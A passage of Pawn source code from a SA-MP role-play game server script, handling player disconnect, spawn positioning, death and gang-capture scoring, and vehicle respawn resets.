    {
        for(new i;i <10; i++) TextDrawHideForPlayer(playerid, CheatText[i]);
        new text[10] = "Кик";
        switch(reason)
        {
            case 0: text = "Вылет";
            case 1: text = "Выход";
		}
		static const fmt_str[] = "[A] %s вышел с сервера (%s)";
		new str[sizeof(fmt_str)+32+10];
		format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername],text);
	    SendAdminMessage(CYELLOW,str);
    	for(new i = 1;i <= 100;i++)
		{
			if(!admincar[playerid][i]) continue;
			DestroyVehicle(admincar[playerid][i]);
			admincar[playerid][i] = 0;
		}
		for(new i = 1;i < 20;i++)
		{
			if(!ctable[playerid][i]) continue;
			DestroyDynamicObject(ctable[playerid][i]);
			ctable[playerid][i] = 0;
	    }
    }
    if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
    ExitPlayerFromSlotMachine(playerid);

    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);

	TextDrawHideForPlayer(playerid,Box);
    for(new i = 0; i < 8; i++) TextDrawHideForPlayer(playerid,TexturesLoading[i]);
	if(SlotTimer[playerid] != -1) KillTimer(SlotTimer[playerid]);
//	PlayerTextDrawDestroy(playerid,ViborSP[playerid]);
	for(new i = 0;i <= 17;i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 	for(new i = 0;i <= 2;i++) PlayerTextDrawDestroy(playerid,ObjectBuyP[i][playerid]);
  //  for(new i = 0;i <= 2;i++) TextDrawHideForPlayer(playerid,ViborSP1[i]);

    //PlayerTextDrawDestroy(playerid,Golod[playerid]);
    for(new i = 0;i <= 6;i++) PlayerTextDrawDestroy(playerid,SpeedometrP[i][playerid]);
    for(new i = 0;i <= 28;i++) TextDrawHideForPlayer(playerid,Speedometr[i]);
    
    for(new i = 0; i < 38; i++) TextDrawHideForPlayer(playerid,Inventory[i]);
    for(new i = 0; i < 15; i++) TextDrawHideForPlayer(playerid,Inventory1[i]);
	for(new i = 0;i <= 7; i++) TextDrawHideForPlayer(playerid,OSN[i]);
	PlayerTextDrawDestroy(playerid,PriceText);
	return 1;
}

public OnPlayerSpawn(playerid)
{
	DeletePVar(playerid,"AmmoTimer");
	DeletePVar(playerid,"AmmoVR");
	DeletePVar(playerid,"DrugsVR");
    if(IsPlayerNPC(playerid)) //?????????: ?????????? ?? ?????(NPC).
    {
        printf("/// 1");
        new npcname[MAX_PLAYER_NAME];
        GetPlayerName(playerid, npcname, sizeof(npcname)); //???????? ??? ?????? (NPC).
        if(!strcmp(npcname, "MyFirstNPC", true)) //????????? ???? ??? MyFirstNPC.
        {
            npcid = playerid;
            SetPlayerSkin(playerid,7);
           	SetPlayerPos(playerid,2,2,2);
			SetPlayerVirtualWorld(playerid,1); //???????? NPC ? ?????????, ??????? ?? ??????? ????.
        }
        return 1;
    }

    if(PlayerLogged[playerid] == false)
	{
	    SendClientMessage(playerid,CLIGHTRED,"Вы не авторизованы");
		Kick(playerid, FIX_FUNCTION, 1200);
		return false;
	}
    tp__ignore_tick[playerid] = GetTickCount()+TP__IGNORE_TIME;
    gun__ignore_tick[playerid] = GetTickCount()+GUN__IGNORE_TIME;
   	if(GetPVarInt(playerid,"ShaSpawn") > 0)
	{
//	 	PlayerTextDrawShow(playerid,ViborSP[playerid]);
		PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],"Los Santos");
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"PLANE");
	//	PlayerInfo[playerid][pSpawn] = 3;
		for(new i = 0; i <= 17; i++) TextDrawShowForPlayer(playerid,ObjectBuy[i]);
		for(new i = 0; i <= 1; i++) PlayerTextDrawShow(playerid,ObjectBuyP[i][playerid]);
		SetPVarInt(playerid,"SpawnVib",0);
		SetPVarInt(playerid,"Gorod",1);
	//	for(new i = 0;i <= 2;i++) TextDrawShowForPlayer(playerid,ViborSP1[i]);
		SelectTextDraw(playerid, 0xAFAFAFAA);
		SetPlayerVirtualWorld(playerid,0);
		TogglePlayerSpectating(playerid,true);
		InterpolateCameraPos(playerid, 1364.583374, -2373.431152, 104.466720, 1426.709960, -2274.038818, 20.591976, 5000);
		InterpolateCameraLookAt(playerid, 1367.391357, -2370.494384, 101.552726, 1430.618041, -2276.692382, 18.953020, 5000);
		//SetPlayerPos(playerid,1734.5009,-1873.0341,21.6052);
		DeletePVar(playerid,"ShaSpawn");
		return true;
	}
	if(GetPVarInt(playerid,"Lomka"))
	{
	    ClearAnim(playerid);
	    KillTimer(GetPVarInt(playerid,"Lomka"));
	    DeletePVar(playerid,"Lomka");
	    DeletePVar(playerid,"AntiSbiv");
		DeletePVar(playerid,"Sbiv");
	}
	if(GetPVarInt(playerid,"InJob") == 1)
	{
		DestroyDynamicCP(GetPVarInt(playerid,"JobCP"));
		DeletePVar(playerid,"JobCP");
		DeletePVar(playerid,"InJob");
	}
//	GangZoneShowForPlayer(playerid,towngz[0],0x000000FF);
//	GangZoneShowForPlayer(playerid,towngz[1],0x000000FF);
   	for(new i = 1;i<=TOTALGZ;i++)
	{
		GangZoneShowForPlayer(playerid,GZInfo[i][id],GetGangZoneColor(GZInfo[i][gFrak]));
		if(ZoneBat[i] == 1) GangZoneFlashForPlayer(playerid,GZInfo[i][id],0xFF6152AA);
	}
 	GangZoneShowForAll(armzone,0x03410DAA);
	PlayerInfo[playerid][pRolik] = 0;
    SetMoney(playerid, PlayerInfo[playerid][pCash]);
    SetAcs(playerid);
    SetPlayerFightingStyle (playerid, PlayerInfo[playerid][pFight]);
    ResetPlayerWeapons(playerid);
	SetProgressBarValue(Golod, PlayerInfo[playerid][pGolod]);
	UpdateProgressBar(Golod, playerid);
    player__kill{playerid} = 1;
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	if(PlayerInfo[playerid][pHeal] < 10) PlayerInfo[playerid][pHeal] = 10;
	SetHealth(playerid,PlayerInfo[playerid][pHeal]);
	SetPlayerSkills(playerid);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 2)) RemovePlayerAttachedObject(playerid, 2);
	if(GetPVarInt(playerid,"Gruz") > 0)
	{
		DeletePVar(playerid,"Gruz");
		DeletePVar(playerid,"GruzW");
		DisablePlayerCheckpoint(playerid);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
		DeletePVar(playerid,"GruzC");
	}
	if(GetPVarInt(playerid,"Pes") > 0)
	{
		DeletePVar(playerid,"Pes");
		DeletePVar(playerid,"PesW");
		DisablePlayerCheckpoint(playerid);
		if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     	if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
		DeletePVar(playerid,"PesC");
	}
	if(GetPVarInt(playerid,"Povar") > 0)
	{
		DeletePVar(playerid,"Povar");
		DeletePVar(playerid,"PovarW");
		DisablePlayerCheckpoint(playerid);
		DeletePVar(playerid,"PovarC");
		DeletePVar(playerid,"PovarM");
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		if(IsValidDynamicObject(GetPVarInt(playerid,"PovarObject"))) DestroyDynamicObject(GetPVarInt(playerid,"PovarObject")),DeletePVar(playerid,"PovarObject");
		DeletePVar(playerid,"PovarEda");
	}
	if(GetPVarInt(playerid,"InDrift"))
	{
		DeletePVar(playerid,"InDrift");
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		DeletePVar(playerid,"DriftO");
		DeletePVar(playerid,"InDrift");
		DestroyVehicle(driftveh[GetPVarInt(playerid,"DriftVeh")]);
		driftveh[GetPVarInt(playerid,"DriftVeh")] = INVALID_VEHICLE_ID;
		DeletePVar(playerid,"DriftVeh");
		KolvoIg--;
	}
	if(GetPVarInt(playerid,"Anim") == 0)
	{
	    ApplyAnimation(playerid,"PED","KO_SHOT_FRONT",0.0,0,0,0,0,0);
		PreloadAnimLib(playerid,"CARRY");
		PreloadAnimLib(playerid,"CHAINSAW");
		PreloadAnimLib(playerid,"OTB");
		PreloadAnimLib(playerid,"BOMBER");
		PreloadAnimLib(playerid,"Attractors");
		PreloadAnimLib(playerid,"FOOD");
		PreloadAnimLib(playerid,"GANGS");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"CRACK");
		PreloadAnimLib(playerid,"JST_BUISNESS");
		PreloadAnimLib(playerid,"benchpress");
		PreloadAnimLib(playerid,"GYMNASIUM");
		PreloadAnimLib(playerid,"Freeweights");
		PreloadAnimLib(playerid,"DAM_JUMP");
		PreloadAnimLib(playerid,"DEALER");
		PreloadAnimLib(playerid,"TATTOOS");
		PreloadAnimLib(playerid,"BEACH");
		PreloadAnimLib(playerid,"RYDER");
		PreloadAnimLib(playerid,"SHOP");
		PreloadAnimLib(playerid,"PED");
		PreloadAnimLib(playerid,"FAT");
		PreloadAnimLib(playerid,"DANCING");
		PreloadAnimLib(playerid,"SMOKING");
		PreloadAnimLib(playerid,"ON_LOOKERS");
		PreloadAnimLib(playerid,"SWORD");
		PreloadAnimLib(playerid,"PAULNMAC");
		PreloadAnimLib(playerid,"GRAFFITI");
		PreloadAnimLib(playerid,"CRIB");
		PreloadAnimLib(playerid,"OTB");
		PreloadAnimLib(playerid,"SPRAYCAN");
		PreloadAnimLib(playerid,"SWEET");
		PreloadAnimLib(playerid,"RIOT");
		PreloadAnimLib(playerid,"benchpress");
		PreloadAnimLib(playerid,"LOWRIDER");
		PreloadAnimLib(playerid,"BSKTBALL");
		PreloadAnimLib(playerid,"CAMERA");
		PreloadAnimLib(playerid,"CAR");
		PreloadAnimLib(playerid,"CAR_CHAT");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"GHANDS");
		PreloadAnimLib(playerid,"CRIB");
		PreloadAnimLib(playerid,"GRAVEYARD");
		PreloadAnimLib(playerid,"MISC");
		PreloadAnimLib(playerid,"INT_HOUSE");
		PreloadAnimLib(playerid,"INT_OFFICE");
		PreloadAnimLib(playerid,"MEDIC");
		SetPVarInt(playerid,"Anim",1);
	}
	SetSkin(playerid);
	printf("OnPlayerSpawn");
	SettingSpawn(playerid);
	if(!IsPlayerInAnyVehicle(playerid)) GetPlayerPos(playerid, player__pos[0][playerid], player__pos[1][playerid], player__pos[2][playerid]);
	else GetVehiclePos(GetPlayerVehicleID(playerid), player__pos[0][playerid], player__pos[1][playerid], player__pos[2][playerid]);
	return true;
}
stock SettingSpawn(playerid)
{
	if(GetPVarInt(playerid,"Spec") > 0 || GetPVarInt(playerid,"PutCam") > 0)
	{
		SetPlayerPos(playerid,GetPVarFloat(playerid,"Specx"),GetPVarFloat(playerid,"Specy"),GetPVarFloat(playerid,"Specz"));
		SetPlayerInterior(playerid,GetPVarInt(playerid,"Speci"));
		SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"Specv"));
		SetTimerEx("GivePatr",2000,false,"d",playerid);
		DeletePVar(playerid,"Spec");
		DeletePVar(playerid,"SpecID");
		return true;
	}
	if(GetPVarInt(playerid,"InDog"))
	{
	    SetPlayerVirtualWorld(playerid,11);
	    new rand = random(3);
		switch(DogMap)
		{
		    case 0:
		    {
		        SetPlayerPos(playerid,Map1[rand][0]+random(2),Map1[rand][1]+random(2),Map1[rand][2]);
		        SetPlayerFacingAngle(playerid,Map1[rand][3]+random(2));
		        SetPlayerInterior(playerid,floatround(Map1[rand][4]));
		    }
		    case 1:
		    {
		        SetPlayerPos(playerid,Map2[rand][0]+random(2),Map2[rand][1]+random(2),Map2[rand][2]);
		        SetPlayerFacingAngle(playerid,Map2[rand][3]+random(2));
		        SetPlayerInterior(playerid,floatround(Map2[rand][4]));
		    }
		    case 2:
		    {
		        SetPlayerPos(playerid,Map3[rand][0]+random(2),Map3[rand][1]+random(2),Map3[rand][2]);
		        SetPlayerFacingAngle(playerid,Map3[rand][3]+random(2));
		        SetPlayerInterior(playerid,floatround(Map3[rand][4]));
		    }
		    case 3:
		    {
		        SetPlayerPos(playerid,Map4[rand][0]+random(2),Map4[rand][1]+random(2),Map4[rand][2]);
		        SetPlayerFacingAngle(playerid,Map4[rand][3]+random(2));
		        SetPlayerInterior(playerid,floatround(Map4[rand][4]));
		    }
		}
		return 1;
	}
	if(GetPVarInt(playerid,"KomGG") > 0)
	{
	    SetPlayerVirtualWorld(playerid,10);
	    SetPlayerInterior(playerid,0);
		GivePlayerWeapon(playerid,ggun[GetPVarInt(playerid,"Level")-1],1000);
		new Float:spawnggred[3][3] = {
			{-2306.4883,1544.1134,18.7734}, // red team
			{-2311.2781,1539.0950,18.7734}, // red team
			{-2312.8496,1552.6167,18.7734} // red team
		};
		new Float:spawnggblue[3][3] = {
			{-2472.2449,1545.8777,33.2273}, // blue team
			{-2473.4951,1551.4512,33.2273}, // blue team
			{-2477.2046,1548.4592,33.2344} // blue team
		};
		new rand = random(3);
		new area;
		if(IsValidDynamicArea(GetPVarInt(playerid,"AreaSK"))) DestroyDynamicArea(GetPVarInt(playerid,"AreaSK")),DeletePVar(playerid,"AreaSK");
		if(GetPVarInt(playerid,"KomGG") == 1)
		{
			SetPlayerColor(playerid, 0xFF0000FF);
			SetPlayerSkin(playerid,170);
			SetPlayerPos(playerid,spawnggred[rand][0],spawnggred[rand][1],spawnggred[rand][2]);
			area = CreateDynamicSphere(spawnggred[rand][0],spawnggred[rand][1],spawnggred[rand][2], 2.0, 10, -1, playerid);
		//	as[playerid][0] = 2201.7109+random(2) ,as[playerid][1] = 85.9338+random(2),as[playerid][2]= 24.9316;
		}
		else
		{
			SetPlayerColor(playerid, 0x2424C7FF);
			SetPlayerSkin(playerid,143);
			SetPlayerPos(playerid,spawnggblue[rand][0],spawnggblue[rand][1],spawnggblue[rand][2]);
			area = CreateDynamicSphere(spawnggblue[rand][0],spawnggblue[rand][1],spawnggblue[rand][2], 2.0, 10, -1, playerid);
		//	as[playerid][0] = 2531.1938+random(2) ,as[playerid][1] = -17.5705+random(2),as[playerid][2]= 26.4898;
		}
		SetPVarInt(playerid,"AreaSK",area);
		SetPVarInt(playerid,"AntiSK",gettime()+10);
		return true;

	}
	if(PlayerInfo[playerid][pJail] > 0)
	{
		switch(PlayerInfo[playerid][pJail])
		{
		    case 1:
		    {
		        SetPVarInt(playerid,"Freeze",1);
				new rand = random(16);
		        SetPlayerPos(playerid,JailPos[rand][0],JailPos[rand][1],JailPos[rand][2]);
		        SetPlayerFacingAngle(playerid,JailPos[rand][3]);
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid, 1);
				DeletePVar(playerid,"Progulka");
		    }
			case 2:
			{
			    SetPlayerPos(playerid,302.3612,306.1608,999.1484);
			    SetPlayerFacingAngle(playerid,358.91105);
				SetPlayerInterior(playerid,4);
				SetPlayerVirtualWorld(playerid, 1);
			}
		}
		return true;
	}
	if(PlayerInfo[playerid][pNHeal])
	{
		if(!random(2))
		{
			SetPlayerPos(playerid,1397.2039,-22.7798,1000.9153);
			SetPlayerFacingAngle(playerid,148.7313);
			FreezePlayer(playerid,1397.2039,-22.7798,0.8);
		}
		else
		{
			SetPlayerPos(playerid,1402.1528,-23.2511,1000.9153);
			SetPlayerFacingAngle(playerid,216.1220);
			FreezePlayer(playerid,1402.1528,-23.2511,0.8);
		}
		SetPlayerInterior(playerid,2);
		SetPlayerVirtualWorld(playerid, 2);
		return true;
	}
	printf("OnPlayerSpawn %d",GetPVarInt(playerid,"GoPos"));
	if(GetPVarInt(playerid,"GoPos") > 0)
	{
		new Float:x[4];
		sscanf(PlayerInfo[playerid][pVPos],"p<,>ffff",x[0],x[1],x[2],x[3]);
		printf("OnPlayerSpawn %f %f %f",x[0],x[1],x[2]);
		SetPlayerPos(playerid,x[0],x[1],x[2]);
		SetPlayerFacingAngle(playerid,x[3]);
		SetPVarInt(playerid,"GoPos",GetPVarInt(playerid,"GoPos")-1);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid,0);
//		SettingSpawn(playerid);
	    return true;
	}
	if(GetPVarInt(playerid,"Firstspawn"))
	{
	    DeletePVar(playerid,"Firstspawn");
	    ShowPlayerDialog(playerid,345,DIALOG_STYLE_MSGBOX,"Помощник","{ffffff}Добро пожаловать на сервер Maryland Role Play!\nНужна ли тебе начальная помощь?","Да","Нет");
	}
    switch(PlayerInfo[playerid][pSpawnChange])
    {
        case 0:
        {
	        switch(PlayerInfo[playerid][pSpawn])
	        {
				case 0:
				{
					SetSpawnInfoEx(playerid,1678.6046,1448.5035,10.7750,276.8253);
				}
				case 1:
				{
				    SetSpawnInfoEx(playerid,2845.8662,1291.0157,11.3906, 90.0034);
				}
				case 2:
				{
				    SetSpawnInfoEx(playerid,2222.8694,1839.0148,10.820, 89.8207);
				}
				case 3: SetSpawnInfoEx(playerid,1446.6733,-2286.7068,13.5469, 90.1943);
		        case 4: SetSpawnInfoEx(playerid,1759.8630,-1894.8911,13.5608, 270.4514);
		        case 5: SetSpawnInfoEx(playerid,1243.1993,-1699.4054,14.8672, 175.1549);
				

			}
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid, 0);
        }
        case 1:
        {
            if(PlayerInfo[playerid][pMember])
            {
	            if((PlayerInfo[playerid][pMember] == F_LVPD ||  PlayerInfo[playerid][pMember] == F_LSPD) && PlayerInfo[playerid][pWorkSpawn])
	            {
	                switch(PlayerInfo[playerid][pWorkSpawn])
	                {
						case 1:
	                    {
							SetPlayerInterior(playerid,1);
							SetPlayerVirtualWorld(playerid, 1);
							SetSpawnInfoEx(playerid,-0.4693,-41.2586,2003.0743,0.6540);
						}
					}
	            }
	            else
	            {
					SetPlayerInterior(playerid,SpawnIn[PlayerInfo[playerid][pMember]-1][0]);
					SetPlayerVirtualWorld(playerid, SpawnIn[PlayerInfo[playerid][pMember]-1][1]);
					SetSpawnInfoEx(playerid,SpawnFrac[PlayerInfo[playerid][pMember]-1][0],SpawnFrac[PlayerInfo[playerid][pMember]-1][1],SpawnFrac[PlayerInfo[playerid][pMember]-1][2], SpawnFrac[PlayerInfo[playerid][pMember]-1][3]);
                    DeletePVar(playerid,"Freeze");
			        TogglePlayerControllable(playerid, 0);
			        FreezePlayer(playerid,SpawnFrac[PlayerInfo[playerid][pMember]-1][0],SpawnFrac[PlayerInfo[playerid][pMember]-1][2]);
	
				}
			}
			else
			{
				PlayerInfo[playerid][pSpawnChange] = 0;
				switch(PlayerInfo[playerid][pSpawn])
				{
					case 0:
					{
						SetSpawnInfoEx(playerid,1678.6046,1448.5035,10.7750,276.8253);
					}
					case 1:
					{
					    SetSpawnInfoEx(playerid,2845.8662,1291.0157,11.3906, 90.0034);
					}
					case 2:
					{
					    SetSpawnInfoEx(playerid,2222.8694,1839.0148,10.820, 89.8207);
					}
					case 3: SetSpawnInfoEx(playerid,1446.6733,-2286.7068,13.5469, 90.1943);
			        case 4: SetSpawnInfoEx(playerid,1759.8630,-1894.8911,13.5608, 270.4514);
			        case 5: SetSpawnInfoEx(playerid,1243.1993,-1699.4054,14.8672, 175.1549);
				}
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid, 0);
			}
        }
        case 2:
        {
			if(GetPlayerHouse(playerid) || GetPlayerZasel(playerid))
		    {
				new i = GetPVarInt(playerid,"PlayerHouse");
				SetPVarInt(playerid,"PHOUSE",i);
				SetSpawnInfoEx(playerid,HInfo[i][hXX],HInfo[i][hYY],HInfo[i][hZZ], HInfo[i][hFa]+180);
				SetPlayerInterior(playerid,HInfo[i][hInt]);
				SetPlayerVirtualWorld(playerid, HInfo[i][hVirt]);
		    }
	   		else if(GetPlayerKom(playerid))
		    {
		        new i = GetPVarInt(playerid,"PlayerKom");
		        SetPlayerVirtualWorld(playerid, i);
	            SetPlayerInterior(playerid,5);
	            SetPVarInt(playerid,"Freeze",1);
	            if(BizInfo[KomInfo[i][kbiz]][bType] == 13) SetSpawnInfoEx(playerid,-0.1794,-8.1853,1996.0859,0.0);
	            else SetSpawnInfoEx(playerid,1281.0703,-36.1240,1000.9205,0.0);
	            SetPVarInt(playerid,"PKOM",i);
	            SetPVarInt(playerid,"PBIZ",KomInfo[i][kbiz]);
		    }
		    else
		    {
		        PlayerInfo[playerid][pSpawnChange] = 0;
		        switch(PlayerInfo[playerid][pSpawn])
		        {
					case 0:
					{
						SetSpawnInfoEx(playerid,1678.6046,1448.5035,10.7750,276.8253);
					}
					case 1:
					{
					    SetSpawnInfoEx(playerid,2845.8662,1291.0157,11.3906, 90.0034);
					}
					case 2:
					{
					    SetSpawnInfoEx(playerid,2222.8694,1839.0148,10.820, 89.8207);
					}
					case 3: SetSpawnInfoEx(playerid,1446.6733,-2286.7068,13.5469, 90.1943);
			        case 4: SetSpawnInfoEx(playerid,1759.8630,-1894.8911,13.5608, 270.4514);
			        case 5: SetSpawnInfoEx(playerid,1243.1993,-1699.4054,14.8672, 175.1549);
				}
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid, 0);
			}
        }
		case 3:
		{
		    new f = PlayerInfo[playerid][pFam];
		    if(f && GetFamHouse(f))
		    {
		        new i = FamInfo[f][fHouse];
				SetPVarInt(playerid,"PHOUSE",i);

				SetSpawnInfoEx(playerid,HInfo[i][hXX],HInfo[i][hYY],HInfo[i][hZZ], HInfo[i][hFa]+180);
				SetPlayerInterior(playerid,HInfo[i][hInt]);
				SetPlayerVirtualWorld(playerid, HInfo[i][hVirt]);
		    }
		    else
		    {
		        PlayerInfo[playerid][pSpawnChange] = 0;
		        switch(PlayerInfo[playerid][pSpawn])
		        {
					case 0:
					{
						SetSpawnInfoEx(playerid,1678.6046,1448.5035,10.7750,276.8253);
					}
					case 1:
					{
					    SetSpawnInfoEx(playerid,2845.8662,1291.0157,11.3906, 90.0034);
					}
					case 2:
					{
					    SetSpawnInfoEx(playerid,2222.8694,1839.0148,10.820, 89.8207);
					}
					case 3: SetSpawnInfoEx(playerid,1446.6733,-2286.7068,13.5469, 90.1943);
					case 4: SetSpawnInfoEx(playerid,1759.8630,-1894.8911,13.5608, 270.4514);
					case 5: SetSpawnInfoEx(playerid,1243.1993,-1699.4054,14.8672, 175.1549);
				}
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid, 0);
			}
		}
    }
    return 1;
}
public OnPlayerDeath(playerid, killerid, reason)
{
    player__kill{playerid} = 0;
    gun__ignore_tick[playerid] = GetTickCount()+GUN__IGNORE_TIME;
//    new bandkiller,bandkill;
	if(GetPVarInt(playerid,"Cops"))
	{
		DeletePVar(GetPVarInt(playerid,"CopsID"),"AttachPlayer");
		SendClientMessage(GetPVarInt(playerid,"CopsID"),CGREY,"Вы упустили преступника!");
		DeletePVar(playerid,"Cops");
		DeletePVar(playerid,"CopsID");
		
	}
	Uncuff(playerid);
	if(GetPVarInt(playerid,"AttachPlayer"))
	{
	    new pl = GetPVarInt(playerid,"AttachPlayer")-1;
	    DeletePVar(playerid,"AttachPlayer");
		DeletePVar(pl,"Cops");
		DeletePVar(pl,"CopsID");
		TogglePlayerControllable(pl, 1);
		SendClientMessage(playerid,CGREY,"Вы упустили преступника!");
		SendClientMessage(pl,CGREY,"Сотрудник упустил Вас!");
	}
	if(killerid != INVALID_PLAYER_ID)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !PlayerInfo[i][pAdmin]) continue;
			SendDeathMessageToPlayer(i, killerid, playerid, reason);
		}
	    PlayerInfo[killerid][pZakon]--;
        if(IsPlayerInRangeOfPoint(killerid, 200.0,290.3426,-109.6755,1001.5156) || IsPlayerInRangeOfPoint(killerid, 200.0,336.8687,1916.5459,17.6406))
        {
			if((IsAGang(playerid) || IsAMafia(playerid)) && GetPVarInt(playerid,"AmmoVR") && PlayerInfo[killerid][pMember] == F_ARMY)
		    {
				DeletePVar(playerid,"AmmoVR");
				SetPlayerSpecialAction(playerid,0);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		        FracMats[F_ARMY] += 250;
		        SetMatsInt("armysamats",FracMats[F_ARMY]);
			    UpdateArmy();
		        SendClientMessage(playerid,CRED,"У Вас отняли материалы!");
		        SendClientMessage(killerid,CREWARD,"Вы вернули материалы на склад. К вашей зарплате прибавлено $50");
		        PlayerInfo[killerid][pPayDay] += 30;
		    }
	    }
		if(PlayerInfo[playerid][pMask])
		{
		    InvMinus(playerid,316,1);
	    	PlayerInfo[playerid][pMask] = 0;
	    }
	    if(GetPVarInt(killerid,"KomGG") && InGameGG)
		{
		    SetPVarInt(killerid,"KillGG",GetPVarInt(killerid,"KillGG")+1);
		    if(GetPVarInt(killerid,"KillGG")/3 == GetPVarInt(killerid,"Level") && GetPVarInt(killerid,"Level") < 5)
		    {
		        SetPVarInt(killerid,"Level",GetPVarInt(killerid,"Level")+1);
		        ResetPlayerWeapons(killerid);
		        GameTextForPlayer(killerid, "~g~LEVEL UP!", 3000, 3);
		        GivePlayerWeapon(killerid,ggun[GetPVarInt(killerid,"Level")-1],1000);
		    }
		}
		
		if(IsAGang(playerid) || IsAMafia(playerid))
		{
			if(CaptInfo[PlayerInfo[playerid][pMember]-6][capture])
			{
			    if(GetPVarInt(playerid,"NHeal") > 3)
			    {
			        PlayerInfo[playerid][pNHeal] = 1;
			        DeletePVar(playerid,"NHeal");
			    }
			    else SetPVarInt(playerid,"NHeal",GetPVarInt(playerid,"NHeal")+1);
			}
			else PlayerInfo[playerid][pNHeal] = 1;
			new killerfrac = PlayerInfo[killerid][pMember]-6;
	 		new playerfrac = PlayerInfo[playerid][pMember]-6;
	  		for(new i1 = 1; i1 <= TOTALGZ; i1++)
		    {

				if(!CaptInfo[killerfrac][capture] || !CaptInfo[playerfrac][capture]) continue;
				if(PlayerInfo[killerid][pMember] != CaptInfo[playerfrac][capture]) continue;
				if(!PlayerToKvadrat(killerid,GZInfo[i1][gCoords][0], GZInfo[i1][gCoords][1],GZInfo[i1][gCoords][2],GZInfo[i1][gCoords][3])) continue;
				CaptInfo[killerfrac][score]++;
				SetPVarInt(killerid,"KillCapt",GetPVarInt(killerid,"KillCapt")+1);
				PlayerInfo[killerid][pGangScore]++;
				PlayerInfo[killerid][pCrimeStats][C_KILLS]++;
				PlayerInfo[playerid][pCrimeStats][C_DEATH]++;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(!IsPlayerConnected(i) || PlayerLogged[i] == false  || PlayerInfo[i][pAdmin]) continue;
					if(PlayerInfo[i][pMember] != PlayerInfo[killerid][pMember] && PlayerInfo[i][pMember] != PlayerInfo[playerid][pMember]) continue;
					SendDeathMessageToPlayer(i, killerid, playerid, reason);
				}
				if(!PlayerInfo[killerid][pQuestS][10])
				{
					PlayerQuest[killerid][10][0]++;
					CheckQuest(killerid,10);
				}
				CaptureUpd(PlayerInfo[killerid][pMember]);
			}
		}
		else PlayerInfo[playerid][pNHeal] = 1;
	}
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	if(vehicleid == INVALID_VEHICLE_ID) return 1;
    if(Indicators_xqz[vehicleid][2]) DestroyObject(Indicators_xqz[vehicleid][2]), DestroyObject(Indicators_xqz[vehicleid][3]),DestroyObject(Indicators_xqz[vehicleid][5]),Indicators_xqz[vehicleid][2]=0;
    if(Indicators_xqz[vehicleid][0]) DestroyObject(Indicators_xqz[vehicleid][0]), DestroyObject(Indicators_xqz[vehicleid][1]),DestroyObject(Indicators_xqz[vehicleid][4]),Indicators_xqz[vehicleid][0]=0;
    ServerHPVehicle[vehicleid] = 1000.0;
  //  Mati[vehicleid] = 0;
  	if(vehicleid == botcar) 
  	{
		GetVehicleParamsEx(botcar, engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(botcar, engine, lights, alarm, doors, VEHICLE_PARAMS_ON, boot, objective);
		CarDoors(botcar,1);
  	}
  	for(new i = 0; i<= 35; i++)
  	{
  	    BInfo[vehicleid][bInvSlot][i] = 0;
  	    BInfo[vehicleid][bInvKol][i] = 0;
  	}
	BInfo[vehicleid][bBox] = 0;
    BInfo[vehicleid][bWork] = 0;
    BInfo[vehicleid][bMats] = 0;
    BInfo[vehicleid][bDrugs] = 0;
    BInfo[vehicleid][bHeal] = 0;
	BInfo[vehicleid][bLock] = 1;
	GetVehiclePos(vehicleid, veh__pos[vehicleid][0], veh__pos[vehicleid][1], veh__pos[vehicleid][2]);
